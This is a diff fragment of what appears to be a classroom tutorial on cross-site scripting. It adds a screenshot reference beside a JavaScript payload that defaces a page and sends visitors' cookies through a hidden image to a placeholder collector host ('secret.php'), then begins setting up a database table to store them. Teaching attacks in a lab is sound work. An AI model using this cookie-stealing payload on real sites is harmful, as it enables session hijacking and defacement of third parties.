@@ -138,6 +138,9 @@ var fakeimage = "http://<YOUR_CONTAINER_ADDRESS>/secret.php?image=";
 document.write("<div style=\"position:absolute; left:0px; top:0px; height:100%; width:100%; background-color:#FFFFFF; text-align: center;\"><img src=\"" + catimage + "\" style=\"position: relative; height:200px;\" /><p style=\"font-size:3em;\">NYA! YUR SITE IS MINE! #HACKED<img src=\"" + fakeimage + document.cookie + "\" style=\"width:1px; height:1px;\"/></p></div>");
 ```
 
+It should look something like this:
+<img src="0 - Images/04 security xss code.PNG" alt="1st edit to add login functionality">
+
 Next, you will need to create the secret table in the database, so that information can be collected. Open phpMyAdmin and go in to the techcamp database.
 
 Click on the green SQL Command button, then copy and paste this code in to the text box:
